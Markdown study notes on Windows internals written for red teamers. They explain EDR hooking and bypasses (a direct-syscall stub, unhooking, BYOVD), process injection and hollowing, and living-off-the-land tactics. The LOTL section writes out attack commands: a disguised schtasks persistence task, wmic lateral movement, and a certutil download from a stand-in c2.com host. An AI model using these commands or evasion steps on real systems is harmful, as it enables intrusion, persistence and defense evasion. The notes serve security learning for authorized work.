# Windows Internals for Red Teamers 🔴
**Author:** Muhammad Zubair | Web App Pentester | Red Team & OSINT Analyst  
**Certifications:** CRTA | CO3 (CyberWarFare Labs) | CSCF (98%) | F1NDX OSINT L1-L3  
**Platforms:** HackerOne | Bugcrowd  

> These notes cover Windows Internals concepts essential for Red Teamers and APT simulation.  
> Focus: How Windows works internally, and how attackers exploit that knowledge.

---

## Table of Contents
1. [User Mode vs Kernel Mode](#1-user-mode-vs-kernel-mode)
2. [API Chain: kernel32 → ntdll → SYSCALL](#2-api-chain)
3. [EDR Hooks & Bypass Techniques](#3-edr-hooks--bypass)
4. [Process & Threads](#4-process--threads)
5. [Virtual Memory & VADs](#5-virtual-memory--vads)
6. [PE Format](#6-pe-format)
7. [Process Injection](#7-process-injection)
8. [Living off the Land (LOTL)](#8-living-off-the-land-lotl)
9. [Detection Layers & Bypass Map](#9-detection-layers--bypass-map)
10. [APT Tools Reference](#10-apt-tools-reference)

---

## 1. User Mode vs Kernel Mode

Windows runs in two separate privilege layers:

```
┌──────────────────────────────────────┐
│           USER MODE                  │
│  Applications run here               │
│  (Chrome, Notepad, Malware)          │
│  Limited permissions                 │
│  Cannot touch hardware directly      │
├──────────────────────────────────────┤
│           KERNEL MODE                │
│  Windows core (brain)                │
│  Full hardware access                │
│  Controls everything                 │
│  Crash here = Blue Screen (BSOD)     │
├──────────────────────────────────────┤
│           HARDWARE                   │
│  CPU, RAM, Disk, Network             │
└──────────────────────────────────────┘
```

**Key Rule:** User mode cannot directly access hardware.  
It must ask the Kernel through a chain of calls.

**Red Team Relevance:**
- Malware starts in User Mode (limited)
- Privilege Escalation = gaining Kernel level access
- Most EDR solutions operate at both layers

---

## 2. API Chain

Every action a program takes follows this chain:

```
Your Software (.exe)
        ↓
kernel32.dll         ← Win32 API (developer-friendly, documented)
        ↓
ntdll.dll            ← Native API (low-level, partially documented)
        ↓
SYSCALL instruction  ← CPU switches User Mode → Kernel Mode
        ↓
Windows Kernel       ← actual work done here
        ↓
Hardware/Disk        ← final result
```

### Real Example: Opening a File

```
Chrome wants to open "passwords.txt"
        ↓
kernel32!CreateFile("passwords.txt")
        ↓
ntdll!NtCreateFile(...)
        ↓
SYSCALL (mode switch happens)
        ↓
Kernel: SRM checks Access Token
  → Permission? YES → Handle returned
  → Permission? NO  → Access Denied
```

### Key DLLs Table

| DLL | Role | Layer |
|---|---|---|
| kernel32.dll | Files, Processes, Memory, Network | Win32 |
| kernelbase.dll | Actual implementation of kernel32 | Win32 |
| ntdll.dll | Syscall stubs, gateway to kernel | Native |
| user32.dll | Windows, messages, input | Win32 |
| advapi32.dll | Registry, tokens, security | Win32 |
| ws2_32.dll | Network (Winsock) | Win32 |

### Nt* vs Zw* Functions

| Context | Nt* | Zw* |
|---|---|---|
| User Mode (ntdll) | Same function, same code | Same function, same code |
| Kernel Mode (driver) | Validates user pointers | Skips validation (KernelMode) |

> **Driver Rule:** Always use `Zw*` in kernel drivers to avoid BSOD.

---

## 3. EDR Hooks & Bypass

### How EDR Hooks Work

EDR products patch the first bytes of sensitive ntdll functions at runtime:

```
Normal NtCreateFile:          EDR Hooked NtCreateFile:
─────────────────────         ───────────────────────────
MOV R10, RCX                  JMP 0xEDR_CHECK_CODE  ← hook!
MOV EAX, 55h                  MOV EAX, 55h
SYSCALL                       SYSCALL
RET                           RET
```

When malware calls `NtCreateFile`, it first jumps to EDR's code for analysis.  
If suspicious → **BLOCK**.

### Detection Layers

```
File Downloaded
     ↓ [Layer 1] SmartScreen (browser level)
     ↓ [Layer 2] Defender Static Scan (disk - signature match)
     ↓ [Layer 3] Windows Loader → Memory
     ↓ [Layer 4] AMSI (memory scan before execution)
     ↓ [Layer 5] EDR Hooks on kernel32/ntdll (API monitoring)
     ↓ [Layer 6] ETW - Event Tracing (behavioral)
     ↓ [Layer 7] Kernel Callbacks (deepest - immune to user tampering)
```

### Bypass Techniques

| Technique | What it Does | Detection Risk |
|---|---|---|
| **Direct Syscall** | Skip ntdll, write SYSCALL stub in own code | Medium |
| **Unhooking** | Load clean ntdll from disk, overwrite hooked copy | High |
| **Indirect Syscall** | Jump to SYSCALL instruction inside ntdll (after hook) | Low |
| **BYOVD** | Bring Your Own Vulnerable Driver → disable EDR at kernel | Very Low |

### Direct Syscall Example (Concept)
```asm
; Instead of calling ntdll!NtCreateFile:
my_NtCreateFile:
    MOV R10, RCX
    MOV EAX, 55h    ; hardcoded SSN for NtCreateFile
    SYSCALL
    RET
; EDR hook missed — we never touched ntdll
```

> **Note:** SSNs (System Service Numbers) change between Windows builds.  
> Tools like HellsGate/HalosGate resolve them dynamically at runtime.

### AMSI
**AMSI = Antimalware Scan Interface**  
Scans code in memory before execution.  
Hooks into PowerShell, .NET, VBScript, and more.

```
Code loads into memory
        ↓
AMSI scans the buffer
        ↓
Known bad pattern? → Block
Clean? → Allow execution
```

### ETW
**ETW = Event Tracing for Windows**  
Windows-wide CCTV system logging every action.  
EDR reads these logs in real-time for behavioral detection.

---

## 4. Process & Threads

### What is a Process?

A process is a container Windows creates when a program runs:

```
Process (malware.exe)
├── Virtual Memory    → private address space
├── Access Token      → permissions (who am I?)
├── Handles           → open files/registry/network (numbered keys)
├── Loaded DLLs       → kernel32, ntdll auto-loaded
└── Threads           → actual workers executing code
```

### Access Token

Every process gets a token defining its permissions:

```
Normal User Token:        SYSTEM Token (highest):
User  = Zubair            User  = SYSTEM
Group = Users             Group = Administrators
Privs = Limited           Privs = SeDebugPrivilege
                                  SeLoadDriverPrivilege
                                  (almost unlimited)
```

**Privilege Escalation** = stealing or impersonating a higher-privilege token.

### Handles

When a process opens a file/registry/network:

```
Malware calls: CreateFile("secret.txt")
        ↓
Kernel checks Access Token → Permission? YES
        ↓
Kernel creates Handle #004 → "represents secret.txt"
        ↓
Malware uses Handle #004 for all future operations
(no repeated permission checks)
```

### Important Windows Processes

| Process | Purpose | Red Team Use |
|---|---|---|
| `svchost.exe` | Hosts Windows services | Injection target (always running) |
| `lsass.exe` | Stores credentials in memory | Credential dumping (Mimikatz) |
| `explorer.exe` | Desktop shell | Injection target |
| `winlogon.exe` | Login handler | Persistence target |
| `csrss.exe` | Win32 subsystem | Protected process |

---

## 5. Virtual Memory & VADs

### Virtual Memory Concept

Each process believes it has its own full RAM — Windows manages the illusion:

```
Chrome (thinks it has RAM 0–8GB)
Malware (also thinks it has RAM 0–8GB)
        ↓
Windows Page Table maps:
Virtual 0x1000 → Physical RAM 0x5000 (Chrome)
Virtual 0x1000 → Physical RAM 0x9000 (Malware)
```

Same virtual address, different physical RAM. Processes are isolated.

### Process Memory Layout

```
0xFFFFFFFF ┌─────────────┐
           │ Kernel Space │ ← only kernel access
0x80000000 ├─────────────┤
           │ Stack   ↓   │ ← thread local data
           │             │
           │ Heap    ↑   │ ← dynamic allocations
           ├─────────────┤
           │ DLLs        │ ← kernel32, ntdll
           ├─────────────┤
           │ .exe code   │ ← program instructions
0x00000000 └─────────────┘
```

### VAD — Virtual Address Descriptor

Kernel tracks every memory region in a process via VAD tree:

```
VAD Tree (malware.exe):
├── 0x400000 → malware code      [RX]
├── 0x7FF000 → ntdll.dll         [RX]
├── 0x1A0000 → heap              [RW]
└── 0xAB0000 → injected shellcode [RWX] ← suspicious!
```

**Blue Team:** Scan VAD for regions with RWX (Read+Write+Execute) — rare in legitimate code.

**Red Team Evasion:**
```
Step 1: Allocate RW memory (write shellcode)
Step 2: Change to RX (execute)
Never have RWX simultaneously → less suspicious
```

---

## 6. PE Format

### Structure of a .exe File

```
┌────────────────────┐
│ DOS Header         │ ← "MZ" magic bytes (4D 5A hex)
├────────────────────┤
│ PE Header          │ ← machine type (x64), entry point, sections count
├────────────────────┤
│ Section Headers    │ ← map of all sections
├────────────────────┤
│ .text              │ ← machine code [RX permission]
├────────────────────┤
│ .data              │ ← global variables [RW permission]
├────────────────────┤
│ .rdata             │ ← strings, constants [R only]
├────────────────────┤
│ .idata             │ ← Import Table (which DLLs needed)
└────────────────────┘
```

### Import Table — Analyst's Best Friend

Reveals what a binary does **before running it**:

```
ws2_32.dll → connect()          = will use network
crypt32.dll                      = will use encryption
CreateRemoteThread               = will inject into another process
VirtualAllocEx + WriteProcessMemory = injection indicators
```

### Windows Loader Process

```
Double-click on .exe
        ↓
Read DOS Header → find PE Header
        ↓
Read PE Header → entry point, sections
        ↓
Allocate Virtual Memory
        ↓
Copy sections (.text RX, .data RW)
        ↓
Read Import Table → load required DLLs
        ↓
Jump to Entry Point → code starts
```

---

## 7. Process Injection

### Why Inject?

```
malware.exe running
EDR watching it
        ↓
Inject into svchost.exe (legitimate)
EDR sees svchost doing things
"svchost always does system stuff, normal..."
```

### Classic Injection (Detected in 2026)

```
OpenProcess(svchost)         → get handle
VirtualAllocEx(svchost)      → allocate memory in target
WriteProcessMemory(svchost)  → copy shellcode
CreateRemoteThread(svchost)  → execute it
```

**EDR Detection:** `OpenProcess + WriteProcessMemory + CreateRemoteThread` = red flag.

### Process Hollowing (Stealthier)

```
1. Create svchost.exe SUSPENDED
2. Unmap its original code from memory
3. Write malware code in its place
4. Resume execution
Result: svchost.exe running, but contains malware
```

### Why Processes Cannot Directly Access Each Other

```
Each process = isolated virtual memory
Direct access = impossible (by design)

BUT: Kernel has access to ALL processes
OpenProcess() asks kernel for a handle (bridge)
If permission exists → kernel grants access

Kernel only checks: "Does the token have permission?"
Kernel does NOT check: "Is this malware?"
That's EDR's job, not Kernel's
```

---

## 8. Living off the Land (LOTL)

### Core Concept

```
Traditional attack:
Drop malware.exe → EDR detects file → BLOCK

LOTL attack:
Use Windows' own tools → EDR sees legitimate activity
No malicious file dropped → harder to detect
```

### Delivery: PDF → PowerShell Trigger

```
Attacker sends PDF via phishing
User opens PDF → clicks button
Button triggers PowerShell (Windows built-in)
SmartScreen doesn't flag PDF (no malicious bytes)
PowerShell connects to C2
```

### LOTL Tools & Their Abuse

| Tool | Legitimate Purpose | Attacker Use |
|---|---|---|
| `PowerShell` | Automation, scripting | C2 comms, encoded commands |
| `WMI` | System/remote management | Lateral movement (no file transfer) |
| `certutil` | Certificate management | Download files from internet |
| `net.exe` | Network info | Enumerate users, machines |
| `schtasks` | Task scheduling | Persistence (runs on login) |
| `mshta.exe` | HTML app runner | Execute remote scripts |
| `rundll32.exe` | Run DLL functions | Execute payloads |
| `reg.exe` | Registry management | Persistence, config changes |

### Full LOTL Attack Flow

```
[1] Phishing PDF → PowerShell triggered
         ↓
[2] PowerShell connects to C2 (encoded command):
    powershell -enc R2V0LVByb2Nlc3M=

[3] Recon (all native tools):
    whoami          → who am I?
    ipconfig        → network position?
    net user        → who else is here?
    net view        → what machines exist?
    systeminfo      → patched? Windows version?

[4] Persistence (schtasks):
    schtasks /create /tn "Windows Defender Update"
    /tr "powershell -enc <C2_command>" /sc onlogon

[5] Lateral Movement (WMI — no file transfer):
    wmic /node:192.168.1.10 process call create
    "powershell -enc <command>"

[6] Download tools (certutil):
    certutil -urlcache -f http://c2.com/tool.exe
    C:\Windows\Temp\svcupdate.exe

[7] Mission complete — no custom malware dropped
```

### Effectiveness in 2026

| Organization Type | EDR Quality | LOTL Success Rate |
|---|---|---|
| Fortune 500 (US/EU) | CrowdStrike/SentinelOne + SOC | 20–30% |
| Mid-size companies | Basic EDR, no SOC | 60–70% |
| Govt/Small (PK/IN/AF) | Basic AV or nothing | 85–95% |

> **Reality:** 80% of organizations worldwide have weak defenses.  
> LOTL alone is still highly effective against them in 2026.

---

## 9. Detection Layers & Bypass Map

```
┌─────────────────────────────────────────────────────┐
│ ATTACK STAGE     │ DETECTION         │ BYPASS        │
├──────────────────┼───────────────────┼───────────────┤
│ File download    │ SmartScreen       │ PDF/doc macro │
│ Disk write       │ AV static scan    │ Obfuscation   │
│ Memory load      │ AMSI              │ AMSI patch    │
│ API calls        │ EDR hooks         │ Direct syscall│
│ Behavior         │ ETW/behavioral    │ LOTL          │
│ Kernel ops       │ Kernel callbacks  │ BYOVD         │
└─────────────────────────────────────────────────────┘
```

### Modern APT Combo (2024–2026)

```
Entry: Phishing (LOTL — PDF trigger)
         ↓
Establish: PowerShell C2 (LOTL)
         ↓
Escalate: Token impersonation / BYOVD
         ↓
Persist: Scheduled task / Registry (LOTL)
         ↓
Lateral: WMI / RDP / PsExec (LOTL)
         ↓
Collect: Credential dump (LSASS)
         ↓
Exfil: rclone / SFTP (legitimate tools)
```

---

## 10. APT Tools Reference

From the **DARKSIDE Ransomware** case study:

| Tool | Type | Purpose |
|---|---|---|
| Cobalt Strike BEACON | C2 Implant | Command & Control |
| Mimikatz | Credential | Dump LSASS passwords |
| BloodHound | AD Recon | Map Active Directory |
| PowerView | AD Recon | Enumerate AD objects |
| PsExec | Lateral | Remote process execution |
| rclone | Exfil | Data exfiltration to cloud |
| NGROK | Tunnel | Tunnel RDP over internet |
| TeamViewer | Persistence | Remote access (legitimate) |
| Advanced IP Scanner | Recon | Network discovery |

---

## Resources & Further Reading

| Resource | Link |
|---|---|
| MITRE ATT&CK Framework | https://attack.mitre.org |
| MITRE Caldera C2 | https://github.com/mitre/caldera |
| phnt Native API Headers | https://github.com/winsiderss/phnt |
| Windows Syscall Table | https://j00ru.vexillium.org/syscalls/nt/64/ |
| Geoff Chappell (Undocumented) | https://geoffchappell.com |
| Process Hacker | https://processhacker.sourceforge.io |
| Windows Internals Book | Mark Russinovich (7th Edition) |

---

## Coverage Status

```
✅ Completed (Days 1–5):
   User Mode / Kernel Mode
   kernel32 → ntdll → SYSCALL chain
   EDR Hooks & Bypass concepts
   Process, Threads, Access Tokens
   Virtual Memory & VADs
   PE Format & Loader
   Process Injection techniques
   Living off the Land (LOTL)
   AMSI & ETW basics

⏳ Coming Next (Days 6–15):
   LSASS & Credential Dumping
   Persistence Mechanisms
   Privilege Escalation
   Active Directory Attacks
   C2 Communication
   Memory Forensics
   Full APT Simulation
```

---

*Last updated: November 2026*  
*These notes are for educational purposes — authorized red team engagements only.*
